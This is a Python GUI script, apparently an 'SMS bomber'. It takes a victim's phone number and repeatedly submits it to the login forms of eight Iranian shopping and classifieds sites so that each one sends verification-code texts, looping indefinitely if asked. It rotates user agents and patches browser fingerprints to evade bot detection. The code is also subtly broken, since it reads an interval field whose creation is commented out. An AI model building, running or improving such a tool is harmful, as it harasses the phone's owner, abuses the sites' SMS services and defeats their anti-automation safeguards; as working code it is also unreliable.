import tkinter as tk
from tkinter import ttk, messagebox
from playwright.sync_api import sync_playwright
import threading
import time
import random
import os
os.environ["PLAYWRIGHT_DOWNLOAD_HOST"] = "https://npmmirror.com/mirrors/playwright "
os.environ["PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD"] = "1"
from fake_useragent import UserAgent
import logging
logging.basicConfig(filename='app.log', level=logging.DEBUG)

# List of websites with their input and button selectors
WEBSITES = [
    {
        'url': 'https://bimebazar.com/login/',
        'input_selector': 'input[placeholder="شماره تلفن همراه *"]',
        'submit_selector': 'button#get_code_btn'
    },
    {
        'url': 'https://www.sheypoor.com/session ',
        'input_selector': 'input[name="username"]',
        'submit_selector': 'button[type="submit"]'
    },
    {
        'url': 'https://www.digikala.com/users/login/ ',
        'input_selector': 'input[name="username"]',
        'submit_selector': 'button[type="submit"]'
    },
    {
        'url': 'https://divar.ir/new ',
        'input_selector': 'input[placeholder="شمارهٔ موبایل"]',
        'submit_selector': 'button.kt-button.kt-button--primary.auth-actions__submit-button'
    },
     {
        'url': 'https://www.technolife.com/account/Login',
        'input_selector': 'input[name="username"]',
        'submit_selector': 'button[type="submit"]'
    },
     {
        'url': 'https://cafebazaar.ir/signin',
        'input_selector': 'input[placeholder="شماره تلفن همراه خود را وارد کنید"]',
        'submit_selector': 'button[type="submit"]'
    },
     {
        'url': 'https://www.okala.com/auth',
        'input_selector': 'input[name="mobile"]',
        'submit_selector': 'button.flex'
    },
     {
        'url': 'https://gooshishop.com/login?method=mobile',
        'input_selector': 'input[name="UserName"]',
        'submit_selector': 'button[type="submit"]'
    },

]

class App:
    def __init__(self, root):
        self.root = root
        self.root.title("$/\/\$ 80/\/\B£✔")
        self.root.geometry("460x360")
        self.root.configure(bg="black")

        self.font_style = ("Arial", 14, "bold")
        
        # UI Elements
        self.create_widgets()

        self.running = False
        self.stop_flag = False

    def create_widgets(self):
        style = ttk.Style()
        style.configure("TButton", font=self.font_style, padding=6, background="black")
        style.configure("TEntry", font=self.font_style)

        title = tk.Label(self.root, text="$/\/\$ 80/\/\B£✔", fg="white", bg="red", font=("Courier", 20, "bold"))
        title.pack(pady=10)

        tk.Label(self.root, text="Phone Number:", fg="red", bg="black", font=self.font_style).pack()
        self.phone_entry = tk.Entry(self.root, width=30, font=self.font_style, bg="black", fg="red", insertbackground="red")
        self.phone_entry.pack(pady=5)

        #tk.Label(self.root, text="Time Interval (seconds):", fg="red", bg="black", font=self.font_style).pack()
        #self.interval_entry = tk.Entry(self.root, width=30, font=self.font_style, bg="black", fg="red", insertbackground="red")
        #self.interval_entry.insert(0, "10")
        #self.interval_entry.pack(pady=5)

        tk.Label(self.root, text="Number of Repetitions (leave blank for infinite):", fg="red", bg="black", font=self.font_style).pack()
        self.repeats_entry = tk.Entry(self.root, width=30, font=self.font_style, bg="black", fg="red", insertbackground="red")
        self.repeats_entry.pack(pady=5)

        self.start_button = tk.Button(self.root, text="Start", command=self.start_process, fg="red", bg="black", font=self.font_style)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop", state=tk.DISABLED, command=self.stop_process, fg="red", bg="black", font=self.font_style)
        self.stop_button.pack(pady=5)

        self.cycle_label = tk.Label(self.root, text="Cycles Completed: 0", fg="red", bg="black", font=self.font_style)
        self.cycle_label.pack(pady=5)

    def start_process(self):
        self.phone = self.phone_entry.get().strip()
        if not self.phone:
            messagebox.showerror("Error", "Please enter a phone number.")
            return

        try:
            self.interval = int(self.interval_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Invalid interval value.")
            return

        repeats_input = self.repeats_entry.get().strip()
        self.max_repeats = float('inf') if not repeats_input else int(repeats_input)

        self.running = True
        self.stop_flag = False
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.thread = threading.Thread(target=self.run_loop)
        self.thread.start()

    def stop_process(self):
        self.stop_flag = True
        self.root.quit()  # Stop Tkinter loop
        self.root.destroy()  # Close window

    def update_cycle_count(self, count):
        self.cycle_label.config(text=f"Cycles Completed: {count}")

    def run_loop(self):
        ua = UserAgent()
        cycle_count = 0

        while cycle_count < self.max_repeats and not self.stop_flag:
            user_agent = ua.random
            print(f"Using User-Agent: {user_agent}")

            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)

                # Set extra headers and stealth mode
                context = browser.new_context(
                    user_agent=user_agent,
                    extra_http_headers={
                        "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                )

                # Apply stealth settings to avoid detection
                page = context.new_page()
                page.add_init_script("""
                    delete navigator.__proto__.webdriver;
                    window.chrome = {runtime: {}};
                    navigator.chrome = {runtime: {}};
                """)

                for idx, site in enumerate(WEBSITES):
                    if self.stop_flag:
                        break

                    print(f"Processing ({idx+1}/{len(WEBSITES)}): {site['url']}")
                    try:
                        page.goto(site['url'], timeout=30000)

                        # Fill phone number with typing effect
                        page.focus(site['input_selector'])
                        for digit in self.phone:
                            page.type(site['input_selector'], digit)
                            time.sleep(0.1)  # Typing simulation

                        time.sleep(2)  # Small pause before submitting

                        # Forcefully click the submit button
                        page.wait_for_selector(site['submit_selector'], timeout=10000)
                        page.focus(site['submit_selector'])
                        page.click(site['submit_selector'], force=True)

                        time.sleep(1)  # Let the action settle

                    except Exception as e:
                        print(f"Error processing {site['url']}: {e}")
                    finally:
                        try:
                            # Optional: reuse the same page or close and open new
                            pass
                        except:
                            pass

                    # Wait 3 minutes before moving to the next website
                    if idx < len(WEBSITES) - 1 and not self.stop_flag:
                        wait_time = random.uniform(180, 300)  # seconds = 3 minutes
                        print(f"Waiting {wait_time} seconds before next website...")
                        time.sleep(wait_time)

                context.close()
                browser.close()

            cycle_count += 1
            self.root.after(0, self.update_cycle_count, cycle_count)

            # Wait 3 minutes before restarting the cycle
            if cycle_count < self.max_repeats and not self.stop_flag:
                wait_time = 180  # seconds = 3 minutes
                print(f"Cycle complete. Waiting {wait_time} seconds before next cycle...")
                time.sleep(wait_time)

        self.root.after(0, self.start_button.config, {'state': tk.NORMAL})
        self.root.after(0, self.stop_button.config, {'state': tk.DISABLED})
        self.running = False

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()